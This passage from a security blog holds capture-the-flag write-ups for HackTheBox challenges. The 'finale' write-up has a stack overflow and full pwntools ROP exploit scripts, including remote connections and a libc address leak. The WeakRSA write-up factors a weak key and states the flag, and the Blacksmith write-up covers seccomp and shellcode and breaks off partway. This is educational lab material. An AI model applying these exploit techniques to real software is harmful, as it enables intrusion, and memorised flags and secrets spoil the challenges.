impact.</p><h3 id="main-analysis">Main() analysis</h3><p>In order to analyze the binary, I opened it up in <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, made by the NSA. The <code>main()</code> function prints 8 random bytes, asks us for a secret and calls <code>finale()</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">long main()
{
  int iVar1;
  char secret [16];
  char rand [8];
  ulong i;
  
  banner();
  rand = 0;
  iVar1 = open(&quot;/dev/urandom&quot;,0);
  read(iVar1,rand,8);
  printf(&quot;\n[Strange man in mask screams some nonsense]: %s\n\n&quot;,rand);
  close(iVar1);
  secret._0_8_ = 0;
  secret._8_8_ = 0;
  printf(&quot;[Strange man in mask]: In order to proceed, tell us the secret phrase: &quot;);
  __isoc99_scanf(&quot;%16s&quot;,secret);
  i = 0;
  do {
    if (i &gt; 14) {
LAB_CHECK_SECRET:
      iVar1 = strncmp(secret,&quot;s34s0nf1n4l3b00&quot;,15);
      if (iVar1 == 0) {
        finale();
      } else {
        printf(&quot;%s\n[Strange man in mask]: Sorry, you are not allowed to enter here!\n\n&quot;,&quot;\x1b[1;31m&quot;);
      }
      return;
    }
    if (secret[i] == &apos;\n&apos;) {
      secret[i] = &apos;\0&apos;;
      goto LAB_CHECK_SECRET;
    }
    i++;
  } while( true );
}

</code></pre><figcaption>Main function</figcaption></figure><p>As we can see, the secret for the binary is <code>s34s0nf1n4l3b00</code> and <code>finale()</code> gets called after the correct secret has been entered. </p><h3 id="finale-analysis">Finale() analysis</h3><p>As said, <code>main()</code> calls <code>finale()</code> after the secret has been entered. This function asks us for a wish for the next year. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">void finale()
{
  char buf[64];
  
  printf(&quot;\n[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [%p]&quot;,buf);
  printf(&quot;\n\n[Strange man in mask]: Now, tell us a wish for next year: &quot;);
  fflush(stdin);
  fflush(stdout);
  read(0,buf,0x1000);
  write(1,&quot;\n[Strange man in mask]: That\&apos;s a nice wish! Let the Spooktober Spirit be with you!\n\n&quot;,0x54);
  return;
}</code></pre><figcaption>Finale function</figcaption></figure><p>We are given stack leak in the form of <code>char* buf</code>. Furthermore, there is a stack buffer overflow: the buffer length is 64 and we are writing 0x1000 (4096) bytes. In Ghidra we can see that the offset to the return address from the base of <code>buf</code> is <strong>0x48</strong> bytes.</p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image.png" class="kg-image" alt loading="lazy" width="450" height="81"></figure><h3 id="got">GOT</h3><p>Considering checksec said <code>No PIE (0x400000)</code>, we can use the Procedural Linking Table (PLT) section of the binary. This means we could open a potential <code>flag.txt</code> using <code>open()</code>, <code>read()</code> and <code>write()</code>. </p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Considering the protections in the binary listed by checksec state that No eXecute is enabled, we need to use <strong>Return Oriented Programming (ROP) chains</strong>. We want to do the following in the payload:</p><pre><code class="language-c">fd = open(&quot;flag.txt&quot;, 0);
n_read = read(3, buf, size);  // 3 since fd == 3 can be expected
write(1, buf, n_read);</code></pre><p>We have access to:</p><ul><li>Binary/ELF</li><li> &#xA0; GOT and PLT (linked functions)</li><li>&#x2003;Functions (built-in functions)</li><li>Stack</li></ul><p>Using <code>print(*ELF(&apos;challenge/finale&apos;).plt.keys())</code>, we can see that the following functions are available in the PLT sections:</p><figure class="kg-card kg-code-card"><pre><code>strncmp puts write printf alarm
close read srand time fflush
setvbuf open __isoc99_scanf rand</code></pre><figcaption>Available functions in the PLT section</figcaption></figure><p>Now we have the right functions and have access to the stack (for &quot;flag.txt&quot;), we need to need a way to pass function arguments. The x64 calling convention states that function arguments should be passed (in order) via RDI, RSI, RDX, RCX, R8, R9. This means that we need to control the <strong>RDI</strong>, <strong>RSI</strong>, and <strong>RDX</strong> registers via <strong>pop instructions</strong> (called <strong>gadgets</strong>) in the <strong>ROP-chain</strong> in order to pass <strong>3</strong> arguments to <code>open()</code>, <code>read()</code>, and <code>write()</code>. We can search for such gadgets using <a href="https://github.com/Ben-Lichtman/ropr">ropr</a>: a blazing fast multithreaded ROP Gadget finder. Below is my search regex filter for ropr:</p><pre><code class="language-bash">$ ropr -R &apos;^pop (rdi|rsi|rdx); ret;&apos; challenge/finale  
0x004012d6: pop rdi; ret;
0x004012d8: pop rsi; ret;
</code></pre><p>Sadly, ropr <strong>can&apos;t find</strong> any gadgets for the <strong>RDX</strong> register. Even after trying many more search queries (like <strong>EDX </strong>and <strong>DX</strong>), I couldn&apos;t find any results. This means that we need to find a workaround for a high-enough RDX value for <code>read(..., ..., size=RDX)</code>.</p><h3 id="gnu-debugger-gdb">GNU Debugger (GDB)</h3><p>In order to find out a way to get a high RDX value, I used GDB with the <a href="https://github.com/pwndbg/pwndbg">Pwndbg</a> plug-in (please say <code>/pwn-dbg/</code> and not <code>/po&#x28A;ndb&#xE6;g/</code> as the repo proposes). To see the RDX value during runtime, we can use the GDB functions in pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))


p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

file = b&apos;flag.txt\0&apos;
rbp = leak + 0x170

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(0x4014c7)

gdb.attach(p, &apos;b *0x4014c7\ncontinue&apos;)
p.sendafter(b&quot;next year: &quot;, payload)

while True:
    print(p.recv())
</code></pre><figcaption>Payload for opening GDB at the open() call</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>0x00000000004014e0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;[ REGISTERS / show-flags off / show-compact-regs off ]&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
 RAX  0x3
 RBX  0x0
 RCX  0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 RDX  0x8
*RDI  0x3
 RSI  0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 R8   0x3c
 R9   0x7ffc887451bc &#x25C2;&#x2014; 0x3c00007f76
 R10  0x0
 R11  0x246
 R12  0x7ffc887475f8 &#x2014;&#x25B8; 0x7ffc88748289 &#x25C2;&#x2014; &apos;~/Documents/ctf/htb/finale/challenge/finale&apos;
 R13  0x401492 (main) &#x25C2;&#x2014; endbr64 
 R14  0x403d70 (__do_global_dtors_aux_fini_array_entry) &#x2014;&#x25B8; 0x4012a0 (__do_global_dtors_aux) &#x25C2;&#x2014; endbr64 
 R15  0x7f76d739d040 (_rtld_global) &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 RBP  0x7ffc887475c0 &#x2014;&#x25B8; 0x7ffc887475f0 &#x25C2;&#x2014; 0x1
 RSP  0x7ffc887474c0 &#x25C2;&#x2014; 0xe193b4642436643b
*RIP  0x4014e0 (main+78) &#x25C2;&#x2014; call 0x401170
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;[ DISASM / x86-64 / set emulate on ]&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
   0x4014cf &lt;main+61&gt;     lea    rcx, [rbp - 0x20]
   0x4014d3 &lt;main+65&gt;     mov    eax, dword ptr [rbp - 0xc]
   0x4014d6 &lt;main+68&gt;     mov    edx, 8
   0x4014db &lt;main+73&gt;     mov    rsi, rcx
   0x4014de &lt;main+76&gt;     mov    edi, eax
 &#x25BA; 0x4014e0 &lt;main+78&gt;     call   read@plt                      &lt;read@plt&gt;
        fd: 0x3 (~/Documents/ctf/htb/finale/flag.txt)
        buf: 0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
        nbytes: 0x8
 
   0x4014e5 &lt;main+83&gt;     lea    rax, [rbp - 0x20]
   0x4014e9 &lt;main+87&gt;     mov    rsi, rax
   0x4014ec &lt;main+90&gt;     lea    rax, [rip + 0x1425]
   0x4014f3 &lt;main+97&gt;     mov    rdi, rax
   0x4014f6 &lt;main+100&gt;    mov    eax, 0</code></pre><figcaption>GDB breakpoint dump</figcaption></figure><p>As we can see, RDX is equal to 8 which means only 8 bytes of the flag get read and written to stdout. Since we need to read at least 32 bytes, we need to find a way of manipulating the RDX register. We could do this by:</p><ul><li>Calling <code>open(&quot;flag.txt&quot;, 0)</code> using the PLT section in the ELF (which only executes the function and immediately returns after)</li><li><strong>Manipulate RDX</strong></li><li>Calling <code>0x4014e0</code> so we read() with the manipulated RDX and write() to stdout all at once.</li></ul><p>As said, I tried finding gadgets which sadly did not work. After manually analyzing the binary I happened to see the following gadget:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00401476 ba 54 00     MOV       EDX,0x54
               00 00
      0040147b 48 8d 05     LEA       RAX,[s__[Strange_man_in_mask]:_That&apos;s_a_ = &quot;\n[Strange man in mask]: 
               2e 14 00 
               00
      00401482 48 89 c6     MOV       RSI=&gt;s__[Strange_man_in_mask]:_That&apos;s_a_ = &quot;\n[Strange man in mask]: 
      00401485 bf 01 00     MOV       EDI,0x1
               00 00
      0040148a e8 a1 fc     CALL      &lt;EXTERNAL&gt;::write                         ssize_t write(int __fd, void
               ff ff
      0040148f 90            NOP
      00401490 c9            LEAVE
      00401491 c3            RET
</code></pre><figcaption>Part of the finale() function</figcaption></figure><p>As we can see, the EDX register is set to 0x54. This means we will read and write 84 bytes of the flag, which means it&apos;s more than enough and that we have completed the final part of the ROP chain:</p><ul><li>open@PLT(&quot;flag.txt&quot;, 0)</li><li>finale() // to set RDX to 0x54</li><li>Set RDI to 3</li><li>Set RSI to the buffer buf</li><li>JMP <code>0x4016e0</code></li></ul><p>A.k.a.:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">file = b&apos;flag.txt\0&apos;
rbp = leak - 0x5000

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b&quot;next year: &quot;, payload)

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b&quot;next year: &quot;, payload)
</code></pre><figcaption>The Python representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>So, the grant scene of the script is:</p><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
is_remote = False
if is_remote:
    p = remote(&quot;167.99.204.5&quot;, 31431)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))


p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

file = b&apos;flag.txt\0&apos;
rbp = leak - 0x5000

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b&quot;next year: &quot;, payload)

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b&quot;next year: &quot;, payload)
while True:
    print(p.recv())
</code></pre><p></p><h1 id="failed-attempt">Failed attempt</h1><p>In my failed attempt I tried to get remote code execution using leaked libc offsets, but it turned out that the libc version on the server was custom and it was intended to prevent this solution. I had to find out by asking the creator of the challenge.</p><p>The way we leak libc addresses is by calling <code>puts()</code> in the PLT section with the argument being a libc function linked in the GOT section. So, we need to call <code>puts(const char *string);</code> with argument <code>string</code> via the <code>RDI</code> register in AMD64. To control the RDI register, we use a ROP chain that pops RDI:</p><pre><code class="language-bash">$ ropr -R &apos;pop rdi; ret;&apos; challenge/finale
0x004012d6: pop rdi; ret;

==&gt; Found 1 gadgets in 0.004 seconds</code></pre><p>Now we can pop a GOT function address into RDI and call <code>puts()</code> to leak the function offset. Let&apos;s run the following script with the server as target to get their libc version:</p><figure class="kg-card kg-code-card"><pre><code class="language-python3">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
is_remote = False
if is_remote: 
    p = remote(&quot;161.35.173.232&quot;, 31394)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x004012d6)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)
    
    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))

p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

#gdb.attach(p)
for name, addr in e.got.items():
    print(name, &quot;@&quot;, hex(leak_func(addr)))
</code></pre><figcaption>The payload for leaking LIBC addresses</figcaption></figure><p>The output is the following:</p><pre><code>__libc_start_main @ 0x7ff2d7c29dc0
__gmon_start__ @ 0x0
stdout @ 0x7ff2d7e1a780
stdin @ 0x7ff2d7e19aa0
strncmp @ 0x0
puts @ 0x7ff2d7c80ed0
write @ 0x7ff2d7d14a20
printf @ 0x7ff2d7c60770
alarm @ 0x7ff2d7cea5b0
close @ 0x0
read @ 0x7ff2d7d14980
srand @ 0x7ff2d7c460a0
time @ 0x7ffdaafcfc60
fflush @ 0x7ff2d7c7f1b0
setvbuf @ 0x7ff2d7c81670
open @ 0x7ff2d7d14690
__isoc99_scanf @ 0x7ff2d7c62110
rand @ 0x7ff2d7c46760</code></pre><p>When I enter those symbols and addresses into a libc-leak website like <a href="https://libc.rip/">libc.rip</a>, I cannot find a single libc version. That means that there&apos;s a custom libc version, which means we can&apos;t call <code>system()</code> since we don&apos;t have the address.</p>]]></content:encoded></item><item><title><![CDATA[WeakRSA (HackTheBox)]]></title><description><![CDATA[<p>G&apos;day everyone! In this write-up we are going to solve the retired WeakRSA challenge on Hack The Box. In order to do so however it is important you understand some of the basics. You will learn </p><ul><li>Basic RSA</li><li>Decoding pem formats</li></ul><h2 id="how-does-rsa-work">How does RSA work?</h2><p>RSA is an</p>]]></description><link>https://pwning.tech/weakrsa/</link><guid isPermaLink="false">658f44f8d32e980001de21eb</guid><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Cryptography]]></category><dc:creator><![CDATA[statusquo]]></dc:creator><pubDate>Thu, 24 Nov 2022 21:27:26 GMT</pubDate><content:encoded><![CDATA[<p>G&apos;day everyone! In this write-up we are going to solve the retired WeakRSA challenge on Hack The Box. In order to do so however it is important you understand some of the basics. You will learn </p><ul><li>Basic RSA</li><li>Decoding pem formats</li></ul><h2 id="how-does-rsa-work">How does RSA work?</h2><p>RSA is an encryption algorithm which has been around since 1977. To use it you will need to chose two different large prime numbers these will be named p and q. </p><p>By multiplying p and q together you get your modulus named N. Then you can choose your exponent which we will name e. &#xA0;Now you are ready to encrypt your secret message. Using RSA our encryped message will be calculated like this : (message^e) mod N</p><p>In python3 it can be computed like this : </p><blockquote>pow(message,e,N)</blockquote><h2 id="decrypting-rsa">Decrypting RSA</h2><p>Decrypting will be a little bit harder. To do so we first must find phi &#x3C6;(N). We can do so like this : &#x3C6;(N) = &#xA0;(p-1) * (q-1). </p><p>Remember that we need to know p and q to decrypt this is important. We are finally ready to calculate d, the modular inverse of e. This can be done by using the extended euclidean algorithm. You don&apos;t have to understand how (or why) it works but saying it will make you look smart. In python I use xgcd from the libnum library. d will be the first value the algorithm outputs.</p><blockquote>d = xgcd(e,&#x3C6;N) [0]</blockquote><p>&#x2003;The plaintext can then be calculated :</p><p>plaintext = pow(encrypted, d, N)</p><h2 id="solving-the-challenge">Solving the challenge</h2><p>After downloading and extracting the zip we get a key encoded in the pub format. We can decode it using python or just by using an <a href="https://8gwifi.org/PemParserFunctions.jsp">online tool</a> which gives us the following data : </p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-1.png" class="kg-image" alt loading="lazy" width="759" height="265" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-1.png 600w, https://pwning.tech/content/images/2022/11/image-1.png 759w" sizes="(min-width: 720px) 720px"></figure><p>The Modulus being the public key N and the public exponent is our e</p><p>We know that the modulus is just p * q but it will take forever to factor such a large number. If only there was a quicker method. Wait a minute what if there are databases containing the factors of large number... That would be really helpful. After some searching I encountered <a href="http://factordb.com/">this site</a>. Let&apos;s try to input our N :</p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-2.png" class="kg-image" alt loading="lazy" width="1452" height="330" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-2.png 600w, https://pwning.tech/content/images/size/w1000/2022/11/image-2.png 1000w, https://pwning.tech/content/images/2022/11/image-2.png 1452w" sizes="(min-width: 720px) 720px"></figure><p>Looks like we found p and q. From here we can get the flag using python : </p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image-4.png" class="kg-image" alt loading="lazy" width="760" height="654" srcset="https://pwning.tech/content/images/size/w600/2022/11/image-4.png 600w, https://pwning.tech/content/images/2022/11/image-4.png 760w" sizes="(min-width: 720px) 720px"></figure>
        <div class="kg-card kg-file-card kg-file-card-medium">
            <a class="kg-file-card-container" href="https://pwning.tech/content/files/2022/11/solve.py" title="Download" download>
                <div class="kg-file-card-contents">
                    <div class="kg-file-card-title">Solve</div>
                    
                    <div class="kg-file-card-metadata">
                        <div class="kg-file-card-filename">solve.py</div>
                        <div class="kg-file-card-filesize">932 Bytes</div>
                    </div>
                </div>
                <div class="kg-file-card-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><defs><style>.a{fill:none;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round;stroke-width:1.5px;}</style></defs><title>download-circle</title><polyline class="a" points="8.25 14.25 12 18 15.75 14.25"/><line class="a" x1="12" y1="6.75" x2="12" y2="18"/><circle class="a" cx="12" cy="12" r="11.25"/></svg>
                </div>
            </a>
        </div>
        <p>The script should output the flag : </p><blockquote><em>HTB{s1mpl3_Wi3n3rs_4tt4ck}</em></blockquote><p>The lesson this challenge is trying to teach us is that p and q should be above 512 digits. This way the public key is less likely to be factorized, so p and q cant be found and your secret messages wont be able to be decrypted.</p>]]></content:encoded></item><item><title><![CDATA[Blacksmith (HackTheBox)]]></title><description><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/blacksmith">Blacksmith</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>You are the only one who is capable of saving this town and bringing peace upon this land! You found a blacksmith who can create the most powerful</blockquote>]]></description><link>https://pwning.tech/blacksmith/</link><guid isPermaLink="false">658f44f8d32e980001de21e8</guid><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBoo]]></category><category><![CDATA[Seccomp]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Linux Syscalls]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sun, 20 Nov 2022 12:00:00 GMT</pubDate><content:encoded><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/blacksmith">Blacksmith</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>You are the only one who is capable of saving this town and bringing peace upon this land! You found a blacksmith who can create the most powerful weapon in the world! You can find him under the label &quot;./flag.txt&quot;.</blockquote><p>In this write-up, we will learn about <strong>seccomp</strong>, <strong>writing assembly</strong>, and performing <strong>syscalls</strong>. </p><h1 id="summary">Summary</h1><ul><li>First looks</li><li>Finding vulnerability primitives</li><li>Developing AMD64 (x86_64) assembly</li><li>Retrieving the flag</li></ul><h1 id="first-looks">First looks</h1><p>We are given the <code>blacksmith</code> executable binary. Upon running the binary, we are presented with a menu to trade items:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">$ ./blacksmith
Traveler, I need some materials to fuse in order to create something really powerful!
Do you have the materials I need to craft the Ultimate Weapon?
1. Yes, everything is here!
2. No, I did not manage to bring them all!
&gt; 1
What do you want me to craft?
1. sword
2. shield
3. bow
&gt; 3
This bow&apos;s range is the best!
Too bad you do not have enough materials to craft some arrows too..</code></pre><figcaption>The program output</figcaption></figure><p>Usually, I start by checking the binary&apos;s security using pwntools&apos; <code>checksec</code>. In this case, the security of <code>blacksmith</code> binary is:</p><figure class="kg-card kg-code-card"><pre><code class="language-sh">$ checksec blacksmith
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments</code></pre><figcaption>The checksec output</figcaption></figure><p>The fields in checksec mean the following:</p><ul><li>Arch: the CPU architecture and instruction set (x86, ARM, MIPS, ...)</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/relro">RELRO</a>: Relocation Read-Only - secures the <a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">dynamic linking process</a></li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">Stack Canaries</a>: protects against stack buffer overflow attacks</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">NX</a>: No eXecute - write-able memory cannot be executed</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: Position Independable Executable - address randomization </li><li>RWX: Read Write Execute - there&apos;s memory that&apos;s RWX</li></ul><p>The logical conclusion is that we need to write a shellcode to the RWX memory to read out <code>flag.txt</code> (based on the challenge description).</p><h1 id="finding-vulnerability-primitives">Finding vulnerability primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact, like teamwork. An <strong>example</strong> of primitives working together is as follows: </p><ul><li>an information leak primitive to leak an address</li><li>an arbitrary write primitive to control the execution flow</li></ul><p>... which can work together by <strong>controlling the execution flow</strong> by <strong>writing</strong> a <strong><strong>leaked</strong> address.</strong></p><h3 id="main-analysis">Main analysis</h3><p>When I want to find vulnerability primitives, I open the binary in <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, Ghidra is a reverse engineering tool developed by the NSA (yes, <em>that</em> NSA). I start off analyzing a binary at the <code>main</code> function. In this case, it looked like the following:</p><figure class="kg-card kg-code-card"><pre><code class="language-c">void main(void)
{
  size_t __n;
  long in_FS_OFFSET;
  int i_has_things;
  int i_option;
  char *local_20;
  char *local_18;
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  // ...
  __isoc99_scanf(&quot;%d&quot;,&amp;i_has_things);
  if (i_has_things != 1) {
    puts(&quot;Farewell traveler! Come back when you have all the materials!&quot;);
    exit(34);
  }
  printf(s_What_do_you_want_me_to_craft?_1._001012e0);
  __isoc99_scanf(&quot;%d&quot;,&amp;i_option);
  sec();
  if (i_option == 2) {
    shield();
  } else if (i_option == 3) {
    bow();
  } else if (i_option == 1) {
    sword();
  } else {
    write(STDOUT_FILENO,local_18,strlen(local_18));
    exit(261);
  }
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>Decompilation of the main function</figcaption></figure><p>So, the <code>main</code> function does the following:</p><ol><li>setup()</li><li>sec()</li><li>shield(), bow() <strong>or</strong> sword()</li></ol><p>In addition to that, the main function uses canary tokens in variable <code>__can_token</code>. As you can see, if <code>__can_token</code> is not equal to the original value, it means that stack corruption has been detected and hence, <code>__stack_chk_fail</code> is called which exits the program.</p><p>The function <code>setup</code> removes the buffer for stdout and stdin, which is standard and hence not interesting. In contrast, the <code>sec</code> function is interesting.</p><h3 id="sec-function">Sec function</h3><figure class="kg-card kg-code-card"><pre><code class="language-c">void sec(void)

{
  void* ctx;
  long in_FS_OFFSET;
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  // ...
                    // allow sys_read, sys_write, 
                    // sys_open, sys_exit
  ctx = seccomp_init(0);
  seccomp_rule_add(ctx,0x7fff0000,2,0);
  seccomp_rule_add(ctx,0x7fff0000,0,0);
  seccomp_rule_add(ctx,0x7fff0000,1,0);
  seccomp_rule_add(ctx,0x7fff0000,60,0);
  seccomp_load(ctx);
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>The sec function</figcaption></figure><p>We can see that the <code>sec</code> function primarily creates an allow list using <a href="https://en.wikipedia.org/wiki/Seccomp"><strong><code>seccomp</code></strong></a> of the syscalls <code>sys_read</code>, <code>sys_write</code>, <code>sys_open</code>, and <code>sys_exit</code>. (Note that the naming convention for internal syscall functions is a <code>sys_</code> prefix. When we say <code>sys_read</code>, we mean the syscall <code>read</code>.) By doing this, the developer of the program prevents us from executing our shell on the server since we would need to <code>sys_execve(&quot;/bin/sh&quot;, NULL, NULL)</code> for that. Because <code>sys_execve</code> is not on the allow list, we cannot use it. <strong>Remember this for later.</strong></p><h3 id="shield-analysis">Shield analysis</h3><p>Furthermore, we have the <code>shield()</code>, <code>bow()</code> <strong>or</strong> <code>sword()</code> calls in <code>main()</code>. The <code>bow()</code> and <code>sword()</code> functions crash the program before a user can give input, which means that&apos;s irrelevant. So basically, the vulnerability <strong>must be</strong> in <code>shield()</code>. &#xA0;</p><figure class="kg-card kg-code-card"><pre><code class="language-C">void shield(void)

{
  size_t strlen;
  long in_FS_OFFSET;
  char buf[72];
  long __can_token;
  
  __can_token = *(long *)(in_FS_OFFSET + 0x28);
  strlen = ::strlen(s_Excellent_choice!_This_luminous_s_00101080);
  write(1,s_Excellent_choice!_This_luminous_s_00101080,strlen);
  strlen = ::strlen(&quot;Do you like your new weapon?\n&gt; &quot;);
  write(1,&quot;Do you like your new weapon?\n&gt; &quot;,strlen);
  read(0,buf,63);
  (*(code *)buf)();
  if (__can_token != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}</code></pre><figcaption>The shield function</figcaption></figure><p>What sticks out to me in this function is that we have user input and are calling a variable like a function using <code>(*(code *)buf)();</code>. The code <code>(*(code *)buf)();</code> is equivalent to the ASM below: </p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">00100dd9 48 8d 55     LEA       RDX, [RBP - 0x50]   ; code* RDX = &amp;buf
         b0
00100ddd b8 00 00     MOV       RAX, 0x0
         00 00
